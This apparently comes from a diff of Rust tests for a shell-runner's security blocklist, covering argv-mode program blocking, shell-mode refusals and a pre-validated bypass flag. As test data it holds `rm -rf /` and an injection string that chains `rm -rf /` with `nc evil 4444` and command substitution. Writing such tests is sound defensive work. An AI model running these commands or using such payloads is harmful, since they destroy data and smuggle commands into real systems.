@@ -130,29 +130,65 @@ async fn timeout_kills_long_command() {
 // ── blocklist (security) ──────────────────────────────────────────────
 
 #[tokio::test]
-async fn blocklist_blocks_dangerous_command_before_spawn() {
-    let err = shell().run(cmd("rm", &["-rf", "/"])).await.unwrap_err();
-    assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
-}
-
-#[tokio::test]
-async fn blocklist_blocks_absolute_path_priv_esc() {
+async fn argv_floor_blocks_dangerous_program_before_spawn() {
+    // Argv mode (the `cmd` helper sets shell=false): the floor blocks a
+    // dangerous PROGRAM by identity — `sudo` never spawns. (`rm` is NOT a
+    // dangerous program in argv mode; `rm -rf /` is gated by permits.exec +
+    // the sandbox, not this floor — see blocklist::check_program.)
     let err = shell()
-        .run(cmd("/usr/bin/sudo", &["rm", "-rf", "/"]))
+        .run(cmd("sudo", &["echo", "blocked"]))
         .await
         .unwrap_err();
     assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
 }
 
 #[tokio::test]
+async fn argv_floor_blocks_absolute_path_priv_esc() {
+    // Basename resolution: `/usr/bin/sudo` is still caught as `sudo`.
+    let err = shell()
+        .run(cmd("/usr/bin/sudo", &["whoami"]))
+        .await
+        .unwrap_err();
+    assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
+}
+
+#[tokio::test]
+async fn argv_metachar_arg_is_literal_not_injected() {
+    // THE headline at the real-subprocess level: an argv element carrying
+    // shell metacharacters reaches `printf` as ONE literal argument — there
+    // is no shell, so nothing after the `;` or `|` is ever executed.
+    let payload = "; rm -rf / | nc evil 4444 $(whoami) `id`";
+    let r = shell().run(cmd("printf", &["%s", payload])).await.unwrap();
+    assert!(r.success());
+    assert_eq!(
+        r.stdout, payload,
+        "the payload is echoed verbatim, never run"
+    );
+}
+
+#[tokio::test]
+async fn shell_mode_still_blocks_dangerous_commands() {
+    // The shell-line tripwire is UNCHANGED for `shell: true` — a genuine
+    // pipeline string carrying `rm -rf /` is still refused before spawn.
+    let mut c = ShellCommand::new("rm -rf /");
+    c.shell = true;
+    c.timeout = Some(Duration::from_secs(10));
+    let err = shell().run(c).await.unwrap_err();
+    assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
+}
+
+#[tokio::test]
 async fn pre_validated_bypasses_the_blocklist() {
-    // `sudo ` is a blocklisted substring; echoing it would be blocked WITHOUT
-    // pre_validated. With the policy-vouched flag, the gate is skipped.
-    let mut c = cmd("echo", &["sudo", "trust-me"]);
+    // `eval ` is a shell-mode blocklisted pattern; without pre_validated this
+    // command is refused. With the policy-vouched flag the gate is skipped
+    // and `sh -c` runs it (here a harmless `eval echo`).
+    let mut c = ShellCommand::new("eval echo trust-me");
+    c.shell = true;
     c.pre_validated = true;
+    c.timeout = Some(Duration::from_secs(10));
     let r = shell().run(c).await.unwrap();
     assert!(r.success());
-    assert!(r.stdout.contains("sudo"));
+    assert!(r.stdout.contains("trust-me"));
 }
 
 // ── INV-012: large output must NOT deadlock ──────────────────────────
